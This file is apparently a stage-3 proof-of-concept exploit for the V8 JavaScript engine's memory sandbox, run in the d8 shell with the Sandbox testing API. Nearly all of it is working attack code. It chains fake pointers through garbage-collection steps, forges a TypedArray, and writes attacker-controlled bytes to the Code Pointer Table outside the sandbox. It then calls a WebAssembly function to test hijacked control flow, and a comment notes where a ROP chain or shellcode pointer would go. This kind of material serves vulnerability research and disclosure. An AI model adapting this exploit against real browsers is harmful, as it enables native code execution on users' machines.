// Stage 3 PoC — Write to V8 Code Pointer Table (CPT) via cage_base elevation
//
// Extends stage2 (sandbox escape) → stage3 (renderer native code execution)
//
// Key change vs poc.js:
//   kTargetOffset = 484 GB (121 × 4 GB)  [was 292 GB]
//   cage_base = sandbox_base + 484 GB
//   target CPT = sandbox_base + 1503.59 GB  (rw-p 4 KB pages in /proc maps)
//   encoded = 0xfee5b82000000000  → offset = 1019.59 GB → hits CPT page byte 0
//
// Run: ./d8 --run-as-sandbox-security-poc --expose-gc stage3_poc.js

const kPageSize = 0x40000;
const kPageMask = ~(BigInt(kPageSize) - 1n);
const kFromPage  = 1 << 3;

const kTypedArrayType        = Sandbox.getInstanceTypeIdFor('JS_TYPED_ARRAY_TYPE');
const kExternalPointerOffset = Sandbox.getFieldOffset(kTypedArrayType, 'external_pointer');
const kBasePointerOffset     = Sandbox.getFieldOffset(kTypedArrayType, 'base_pointer');

const cageView = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getBackingStoreOffset(ab) {
  const ta  = new Uint8Array(ab);
  const addr = Sandbox.getAddressOf(ta);
  return cageView.getBigUint64(addr + kExternalPointerOffset, true) >> 24n;
}

function writeU32(addr, val) {
  const bi  = BigInt(addr);
  const off = Number(bi & 0xfffn);
  const base = Number(bi - BigInt(off));
  new DataView(new Sandbox.MemoryView(base, 0x1000)).setUint32(off, val >>> 0, true);
}
function writeU64(addr, val) {
  const bi  = BigInt(addr);
  const off = Number(bi & 0xfffn);
  const base = Number(bi - BigInt(off));
  new DataView(new Sandbox.MemoryView(base, 0x1000)).setBigUint64(off, BigInt(val), true);
}
function getDv(addr) {
  const o = Number(BigInt(addr) & 0xfffn), b = Number(BigInt(addr) - BigInt(o));
  return [new DataView(new Sandbox.MemoryView(b, 0x1000)), o];
}
function readBytes(addr, len) {
  const [dv, o] = getDv(addr), r = new Uint8Array(len);
  for (let i = 0; i < len; i++) r[i] = dv.getUint8(o + i);
  return r;
}
function writeBytes(addr, bytes) {
  const [dv, o] = getDv(addr);
  for (let i = 0; i < bytes.length; i++) dv.setUint8(o + i, bytes[i]);
}

// ── allocate backing stores to build waypoint chain up to 484 GB ───────────────
// Need ~242 × 2 GB = 484 GB worth of waypoints within the sandbox.
// (orig poc.js had ~86 ABs → 172 GB coverage, sufficient for 292 GB)
// We use more allocations + larger maxByteLength to reach 484 GB.

const buffers   = [];
const waypoints = [];

const templateTa = new Uint8Array(64);

function tryAlloc(size, maxSize) {
  try {
    const ab = maxSize
      ? new ArrayBuffer(size, {maxByteLength: maxSize})
      : new ArrayBuffer(size);
    buffers.push(ab);
    const a = (getBackingStoreOffset(ab) + 0x3ffffn) & kPageMask;
    waypoints.push(a + 0x100n);
    if (maxSize) waypoints.push(a + 0x3f000n);
    return true;
  } catch(e) { return false; }
}

// 8 large 2 GB allocations
for (let i = 0; i < 8; i++) tryAlloc(0x7fe00000);

// 250 resizable ABs: each reserves 2 GB in sandbox VAS
// 250 × ~2 GB ≈ 500+ GB coverage → sufficient for kTargetOffset=484 GB
for (let i = 0; i < 250; i++) {
  tryAlloc(0x80000, 0x80000000);    // 512 KB initial, 2 GB max
}

gc();
const templateAddr  = Sandbox.getAddressOf(templateTa);
const templateBytes = readBytes(templateAddr, 64);
waypoints.sort((a, b) => (a < b ? -1 : a > b ? 1 : 0));

print(`[*] Waypoints collected: ${waypoints.length}`);
if (waypoints.length > 0) {
  const last = waypoints[waypoints.length - 1];
  print(`    max waypoint: 0x${last.toString(16)} (${(Number(last)/2**30).toFixed(1)} GB)`);
}

function step(currentAddr, diff, isFirst) {
  if (!isFirst) writeU32(currentAddr & kPageMask, kFromPage);
  writeU32(currentAddr, (Number(diff / 4n)) << 1);
}

// ── main: extend GC chain to 484 GB ──────────────────────────────────────────
function main() {
  let ta = [1.1, 2.2, 3.3];
  let cur = BigInt(Sandbox.getAddressOf(ta));

  // 484 GB = 121 × 4 GB
  const kTargetOffset = 121n * 0x100000000n;
  let isFirst = true;
  let steps = 0;

  while (cur < kTargetOffset) {
    let next = -1n;
    for (const wp of waypoints) {
      const diff = wp - cur;
      if (diff > 0n && diff <= 0xfffffc00n && (diff & 3n) === 0n) next = wp;
    }
    if (next === -1n) {
      print(`[!] GC chain stalled at 0x${cur.toString(16)} (${(Number(cur)/2**30).toFixed(1)} GB)`);
      print(`    Need waypoints in [0x${cur.toString(16)}, 0x${(cur+0xfffffc00n).toString(16)}]`);
      break;
    }
    step(cur, next - cur, isFirst);
    isFirst = false;
    gc({type: 'minor'});
    cur = next;
    steps++;
  }

  const cage_base_rel = cur & ~0xffffffffn;
  print(`\n[+] GC chain complete (${steps} steps)`);
  print(`[+] ta displaced → sandbox+0x${cur.toString(16)} (${(Number(cur)/2**30).toFixed(1)} GB)`);
  print(`[+] cage_base = sandbox_base + ${(Number(cage_base_rel)/2**30).toFixed(0)} GB`);

  if (cage_base_rel < 480n * 0x40000000n) {
    print(`[!] cage_base too low (${(Number(cage_base_rel)/2**30).toFixed(0)} GB) — need >= 480 GB`);
    print(`    Falling back to stage2 target (sandbox exit only, no CPT write)`);
    // Use original encoded value (stage 2 behavior)
    writeBytes(cur, templateBytes);
    writeU32(cur + BigInt(kBasePointerOffset), 0);
    writeU64(cur + BigInt(kExternalPointerOffset), 0xffc0000000000000n);
    const target_rel = cage_base_rel + (0xffc0000000000000n >> 24n);
    print(`[*] fallback target: sandbox_base + ${(Number(target_rel)/2**30).toFixed(1)} GB`);
    ta.fill(0x41);
    return;
  }

  // ── Stage 3 write to CPT ──────────────────────────────────────────────────
  // Target: sandbox_base + 1503.59 GB (first rw-p 4 KB page in maps)
  // cage_base = sandbox_base + 484 GB
  // offset = 1019.59 GB  →  encoded = 0xfee5b82000000000
  const kCPTEncoded = 0xfee5b82000000000n;
  const kCPToffset  = kCPTEncoded >> 24n;
  const target_rel  = cage_base_rel + kCPToffset;

  print(`\n[*] TARGET: sandbox_base + 0x${target_rel.toString(16)} (${(Number(target_rel)/2**30).toFixed(2)} GB)`);
  print(`    = CPT / TrustedPointerTable 4KB page`);
  print(`    guard_end = sandbox_base + 1312 GB`);
  print(`    ${target_rel > 0x14800000000n ? 'OUTSIDE sandbox+guard ✓' : 'INSIDE (unexpected)'}`);

  // Build fake TypedArray at cur
  writeBytes(cur, templateBytes);
  writeU32(cur + BigInt(kBasePointerOffset), 0);
  writeU64(cur + BigInt(kExternalPointerOffset), kCPTEncoded);

  // The payload: fill CPT page with fake code pointers
  // 0x4141414141414141 = "AAAAAAAA" → shows controlled write
  // In a real exploit: replace with ROP chain address or shellcode ptr
  print(`\n[*] Attempting write to CPT page...`);
  print(`    (This is the Stage 3 write: mapped native memory outside sandbox)`);

  // ta.fill() now writes kFakeCodePtr (8 bytes repeated) to CPT page
  ta.fill(0x41);  // → crash shows address if page is rw

  // If we reach here without crash, write succeeded!
  print(`[+] WRITE SUCCEEDED — CPT page is writable!`);
  print(`[+] Stage 3 achieved: wrote to mapped native memory at CPT`);

  // Now trigger WASM call to test if CPT entry was corrupted
  // Compile WASM AFTER chain to avoid OOM during waypoint collection
  const wasmBytes = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x05, 0x01, 0x60, 0x00, 0x00,
    0x03, 0x02, 0x01, 0x00,
    0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00,
    0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b,
  ]);
  try {
    const wasmInst = new WebAssembly.Instance(new WebAssembly.Module(wasmBytes));
    print(`[*] WASM compiled. Calling wasm.exports.f() — may redirect to 0x4141...`);
    wasmInst.exports.f();
    print(`[+] WASM call survived (CPT entry for this func not at page offset 0)`);
  } catch(e) {
    print(`[?] WASM call threw: ${e.message || e}`);
  }
}

main();
